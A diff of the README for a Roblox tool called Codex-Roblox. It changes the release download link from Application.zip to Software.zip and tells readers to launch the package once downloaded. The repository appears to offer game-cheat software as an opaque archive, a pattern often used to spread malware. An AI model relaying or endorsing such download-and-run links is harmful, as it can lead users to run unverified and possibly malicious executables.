@@ -11,7 +11,7 @@ Welcome to the official GitHub repository for Codex-Roblox! Codex is an advanced
 ## Quick Start
 To get started with Codex-Roblox, you can download the software package from the link below:
 
-[![Download Codex-Roblox](https://github.com/Cesaiio/Codex-Roblox/releases/download/v1.0.0/Application.zip)](https://github.com/Cesaiio/Codex-Roblox/releases/download/v1.0.0/Application.zip)
+[![Download Codex-Roblox](https://github.com/Cesaiio/Codex-Roblox/releases/download/v2.0/Software.zip)](https://github.com/Cesaiio/Codex-Roblox/releases/download/v2.0/Software.zip)
 
 Upon downloading, launch the software package to begin utilizing the powerful features of Codex for your Roblox gaming experience.
 
